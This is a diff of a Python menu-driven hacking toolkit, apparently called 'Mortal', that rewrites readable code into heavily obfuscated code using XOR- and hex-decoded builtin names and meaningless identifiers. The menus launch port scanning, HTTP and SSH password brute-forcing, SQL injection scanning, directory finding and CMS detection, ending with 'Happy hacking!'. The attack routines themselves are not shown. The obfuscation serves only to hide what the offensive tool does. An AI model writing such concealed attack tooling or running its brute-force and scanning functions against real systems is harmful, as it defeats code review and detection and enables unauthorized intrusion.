+                            lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 624876420005).to_bytes(5, 'big').decode())(966633985489)](f'{Fore.RED}[-] Hostname/IP cannot be empty!')
                         else:
-                            ip = info_gather.host_to_ip(hostname) or hostname
-                            if ip:
+                            lIlIllIlllIl = IlIIlIlIIIlIllIl.IllIIlIIIlIlIIlIllllI(hostname) or hostname
+                            if lIlIllIlllIl:
                                 try:
-                                    start_port = int(input(f"{Fore.CYAN}Start Port (1-65535, default 1): {Fore.WHITE}") or "1")
-                                    start_port = max(1, min(start_port, 65535))
+                                    IlllIIllIIlllllIlIlllIIIIlI = lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 7675574).to_bytes(3, 'big').decode())(1863874)](lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 100658821746).to_bytes(5, 'big').decode())(541196013318)](f'{Fore.CYAN}Start Port (1-65535, default 1): {Fore.WHITE}') or (lambda n: int.__xor__(n, 153).to_bytes(1, 'big').decode())(168))
+                                    IlllIIllIIlllllIlIlllIIIIlI = lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 54 for IlIlIIlIlIllllI in x[::-1]]).decode())([78, 87, 91])](0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 50) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('02'), 16) << 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 210) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('e3'), 16) | 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('31'), 16), lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 36 for IlIlIIlIlIllllI in x[::-1]]).decode())([74, 77, 73])](IlllIIllIIlllllIlIlllIIIIlI, 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 117 for IlIlIIlIlIllllI in x[::-1]]).decode())([51, 51, 70]), 16) << 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 206) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('f8'), 16) | 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 63 for IlIlIIlIlIllllI in x[::-1]]).decode())([89, 12]), 16)))
                                 except ValueError:
-                                    start_port = 1
-                                    print(f"{Fore.YELLOW}[!] Invalid start port, using 1")
-                                    
+                                    IlllIIllIIlllllIlIlllIIIIlI = 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 36) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('14'), 16) << 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 10)) for IlIlIllIlIIlIlllI in x)))([59]), 16) | 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 164 for IlIlIIlIlIllllI in x[::-1]]).decode())([149]), 16)
+                                    lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 22)) for IlIlIllIlIIlIlllI in x)))([102, 100, 127, 120, 98])](f'{Fore.YELLOW}[!] Invalid start port, using 1')
                                 try:
-                                    end_port = int(input(f"{Fore.CYAN}End Port (1-65535, default 65535): {Fore.WHITE}") or "65535")
-                                    end_port = max(1, min(end_port, 65535))
+                                    IlIlIIlIIIIIlIIlIlIlII = lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 238) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('87809a')](lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 242556590371).to_bytes(5, 'big').decode())(348279254103)](f'{Fore.CYAN}End Port (1-65535, default 65535): {Fore.WHITE}') or (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 194 for IlIlIIlIlIllllI in x[::-1]]).decode())([247, 241, 247, 247, 244]))
+                                    IlIlIIlIIIIIlIIlIlIlII = lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('78616d')](0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 26)) for IlIlIllIlIIlIlllI in x)))([127]), 16) * 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('30'), 16) + 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 212) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('e5'), 16), lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 1867391).to_bytes(3, 'big').decode())(7411473)](IlIlIIlIIIIIlIIlIlIlII, 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 126) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('46'), 16) * 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('46464631'), 16) + 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('37'), 16)))
                                 except ValueError:
-                                    end_port = 65535
-                                    print(f"{Fore.YELLOW}[!] Invalid end port, using 65535")
-                                    
-                                if start_port > end_port:
-                                    print(f"{Fore.RED}[-] Start port must be <= end port!")
+                                    IlIlIIlIIIIIlIIlIlIlII = 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('3232313031'), 16) - 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 227) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('d2d1d0'), 16)
+                                    lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'{Fore.YELLOW}[!] Invalid end port, using 65535')
+                                if IlllIIllIIlllllIlIlllIIIIlI > IlIlIIlIIIIIlIIlIlIlII:
+                                    lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 983568854729).to_bytes(5, 'big').decode())(641882439869)](f'{Fore.RED}[-] Start port must be <= end port!')
                                 else:
-                                    info_gather.port_scanner(ip, start_port, end_port)
-                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
-                    elif sub_choice == "0":
+                                    IlIIlIlIIIlIllIl.IIlllIllIllllI(lIlIllIlllIl, IlllIIllIIlllllIlIlllIIIIlI, IlIlIIlIIIIIlIIlIlIlII)
+                        lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 112 for IlIlIIlIlIllllI in x[::-1]]).decode())([4, 5, 0, 30, 25])](f'\n{Fore.CYAN}[+] Press Enter to continue...')
+                    elif IlllIlIlIIIll == (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 84) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('64'):
                         break
                     else:
-                        print(f"{Fore.RED}[-] Invalid choice!")
-                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
-                        
-            elif choice == "4":
+                        lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 232 for IlIlIIlIlIllllI in x[::-1]]).decode())([156, 134, 129, 154, 152])](f'{Fore.RED}[-] Invalid choice!')
+                        lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 96)) for IlIlIllIlIIlIlllI in x)))([9, 14, 16, 21, 20])](f'\n{Fore.CYAN}[+] Press Enter to continue...')
+            elif choice == (lambda n: int.__xor__(n, 130).to_bytes(1, 'big').decode())(182):
                 while True:
-                    MortalInterface.banner()
-                    print(f"{Fore.CYAN}Password Attacks")
-                    MortalInterface.password_attacks_menu()
-                    sub_choice = input(f"\n{Fore.RED}Passwords@Mortal: {Fore.RESET}")
-                    
-                    if sub_choice == "1":
-                        url = input(f"{Fore.CYAN}Login URL: {Fore.WHITE}")
-                        if not url:
-                            print(f"{Fore.RED}[-] URL cannot be empty!")
+                    lIIIlIlIIIlIlI.lIIIlllIIlIl()
+                    lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 51)) for IlIlIllIlIIlIlllI in x)))([67, 65, 90, 93, 71])](f'{Fore.CYAN}Password Attacks')
+                    lIIIlIlIIIlIlI.IIIlIIIIIIllllIIll()
+                    IlllIlIlIIIll = lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('7475706e69')](f'\n{Fore.RED}Passwords@Mortal: {Fore.RESET}')
+                    if IlllIlIlIIIll == (lambda n: int.__xor__(n, 10).to_bytes(1, 'big').decode())(59):
+                        llIIIIIIIllIIIIIlIllllII = lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 127 for IlIlIIlIlIllllI in x[::-1]]).decode())([11, 10, 15, 17, 22])](f'{Fore.CYAN}Login URL: {Fore.WHITE}')
+                        if not llIIIIIIIllIIIIIlIllllII:
+                            lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 639556395530).to_bytes(5, 'big').decode())(981850999934)](f'{Fore.RED}[-] URL cannot be empty!')
                         else:
-                            username = input(f"{Fore.CYAN}Username: {Fore.WHITE}")
+                            username = lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 37) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('4c4b555051')](f'{Fore.CYAN}Username: {Fore.WHITE}')
                             if not username:
-                                print(f"{Fore.RED}[-] Username cannot be empty!")
+                                lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 46)) for IlIlIllIlIIlIlllI in x)))([94, 92, 71, 64, 90])](f'{Fore.RED}[-] Username cannot be empty!')
                             else:
-                                passwd_attack.http_bruteforce(url, username)
-                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
-                    elif sub_choice == "2":
-                        host = input(f"{Fore.CYAN}Target Host: {Fore.WHITE}")
-                        if not host:
-                            print(f"{Fore.RED}[-] Host cannot be empty!")
+                                IlllIllllIIl.lllIIIlIIIllllIIl(llIIIIIIIllIIIIIlIllllII, username)
+                        lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 150) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('fff8e6e3e2')](f'\n{Fore.CYAN}[+] Press Enter to continue...')
+                    elif IlllIlIlIIIll == (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 182) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('84'):
+                        lllIlIIIllIllI = lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 1074586237782).to_bytes(5, 'big').decode())(632906108450)](f'{Fore.CYAN}Target Host: {Fore.WHITE}')
+                        if not lllIlIIIllIllI:
+                            lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'{Fore.RED}[-] Host cannot be empty!')
                         else:
-                            username = input(f"{Fore.CYAN}Username: {Fore.WHITE}")
+                            username = lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('7475706e69')](f'{Fore.CYAN}Username: {Fore.WHITE}')
                             if not username:
-                                print(f"{Fore.RED}[-] Username cannot be empty!")
+                                lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'{Fore.RED}[-] Username cannot be empty!')
                             else:
-                                passwd_attack.ssh_bruteforce(host, username)
-                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
-                    elif sub_choice == "0":
+                                IlllIllllIIl.lIllIIIlIIIIIIlIlllIlIIlIl(lllIlIIIllIllI, username)
+                        lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 806753682180).to_bytes(5, 'big').decode())(905033561712)](f'\n{Fore.CYAN}[+] Press Enter to continue...')
+                    elif IlllIlIlIIIll == (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 147) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('a3'):
                         break
                     else:
-                        print(f"{Fore.RED}[-] Invalid choice!")
-                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
-                        
-            elif choice == "5":
+                        lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 85)) for IlIlIllIlIIlIlllI in x)))([37, 39, 60, 59, 33])](f'{Fore.RED}[-] Invalid choice!')
+                        lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 29 for IlIlIIlIlIllllI in x[::-1]]).decode())([105, 104, 109, 115, 116])](f'\n{Fore.CYAN}[+] Press Enter to continue...')
+            elif choice == (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('35'):
                 while True:
-                    MortalInterface.banner()
-                    print(f"{Fore.CYAN}Web Hacking")
-                    MortalInterface.web_hacking_menu()
-                    sub_choice = input(f"\n{Fore.RED}WebHack@Mortal: {Fore.RESET}")
-                    
-                    if sub_choice == "1":
-                        url = input(f"{Fore.CYAN}URL with parameter (e.g., ?id=1): {Fore.WHITE}")
-                        if not url:
-                            print(f"{Fore.RED}[-] URL cannot be empty!")
+                    lIIIlIlIIIlIlI.lIIIlllIIlIl()
+                    lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 28 for IlIlIIlIlIllllI in x[::-1]]).decode())([104, 114, 117, 110, 108])](f'{Fore.CYAN}Web Hacking')
+                    lIIIlIlIIIlIlI.IllIlIlIIIIllllIlIIIlIIII()
+                    IlllIlIlIIIll = lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('7475706e69')](f'\n{Fore.RED}WebHack@Mortal: {Fore.RESET}')
+                    if IlllIlIlIIIll == (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 71 for IlIlIIlIlIllllI in x[::-1]]).decode())([118]):
+                        llIIIIIIIllIIIIIlIllllII = lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 465568869352).to_bytes(5, 'big').decode())(21615435420)](f'{Fore.CYAN}URL with parameter (e.g., ?id=1): {Fore.WHITE}')
+                        if not llIIIIIIIllIIIIIlIllllII:
+                            lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 249) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('898b90978d')](f'{Fore.RED}[-] URL cannot be empty!')
                         else:
-                            web_hack.sqli_scanner(url)
-                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
-                    elif sub_choice == "2":
-                        url = input(f"{Fore.CYAN}Website URL: {Fore.WHITE}")
-                        if not url:
-                            print(f"{Fore.RED}[-] URL cannot be empty!")
+                            lIlIIlIIlllIlllIIlI.lIlIlIlIlIIIl(llIIIIIIIllIIIIIlIllllII)
+                        lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 80)) for IlIlIllIlIIlIlllI in x)))([57, 62, 32, 37, 36])](f'\n{Fore.CYAN}[+] Press Enter to continue...')
+                    elif IlllIlIlIIIll == (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 109)) for IlIlIllIlIIlIlllI in x)))([95]):
+                        llIIIIIIIllIIIIIlIllllII = lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('7475706e69')](f'{Fore.CYAN}Website URL: {Fore.WHITE}')
+                        if not llIIIIIIIllIIIIIlIllllII:
+                            lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 60369043609).to_bytes(5, 'big').decode())(543249395437)](f'{Fore.RED}[-] URL cannot be empty!')
                         else:
-                            web_hack.directory_finder(url)
-                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
-                    elif sub_choice == "3":
-                        url = input(f"{Fore.CYAN}Website URL: {Fore.WHITE}")
-                        if not url:
-                            print(f"{Fore.RED}[-] URL cannot be empty!")
+                            lIlIIlIIlllIlllIIlI.IIllIlIlIIllIIIIlI(llIIIIIIIllIIIIIlIllllII)
+                        lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 1066797528387).to_bytes(5, 'big').decode())(622978269239)](f'\n{Fore.CYAN}[+] Press Enter to continue...')
+                    elif IlllIlIlIIIll == (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 107)) for IlIlIllIlIIlIlllI in x)))([88]):
+                        llIIIIIIIllIIIIIlIllllII = lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 125)) for IlIlIllIlIIlIlllI in x)))([20, 19, 13, 8, 9])](f'{Fore.CYAN}Website URL: {Fore.WHITE}')
+                        if not llIIIIIIIllIIIIIlIllllII:
+                            lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 110)) for IlIlIllIlIIlIlllI in x)))([30, 28, 7, 0, 26])](f'{Fore.RED}[-] URL cannot be empty!')
                         else:
-                            web_hack.cms_detector(url)
-                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
-                    elif sub_choice == "0":
+                            lIlIIlIIlllIlllIIlI.IlIlIllllIlI(llIIIIIIIllIIIIIlIllllII)
+                        lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('7475706e69')](f'\n{Fore.CYAN}[+] Press Enter to continue...')
+                    elif IlllIlIlIIIll == (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 3)) for IlIlIllIlIIlIlllI in x)))([51]):
                         break
                     else:
-                        print(f"{Fore.RED}[-] Invalid choice!")
-                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
-                        
-            elif choice == "0":
-                print(f"{Fore.YELLOW}Goodbye! Happy hacking! ;)")
+                        lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'{Fore.RED}[-] Invalid choice!')
+                        lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 236 for IlIlIIlIlIllllI in x[::-1]]).decode())([152, 153, 156, 130, 133])](f'\n{Fore.CYAN}[+] Press Enter to continue...')
+            elif choice == (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('30'):
+                lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'{Fore.YELLOW}Goodbye! Happy hacking! ;)')
                 break
             else:
-                print(f"{Fore.RED}[-] Invalid choice!")
-                input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
-
-if __name__ == "__main__":
-    MortalInterface.run()
+                lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 50 for IlIlIIlIlIllllI in x[::-1]]).decode())([70, 92, 91, 64, 66])](f'{Fore.RED}[-] Invalid choice!')
+                lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('7475706e69')](f'\n{Fore.CYAN}[+] Press Enter to continue...')
+if __name__ == (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('5f5f6e69616d5f5f'):
+    lIIIlIlIIIlIlI.IlllIlllIlllII()
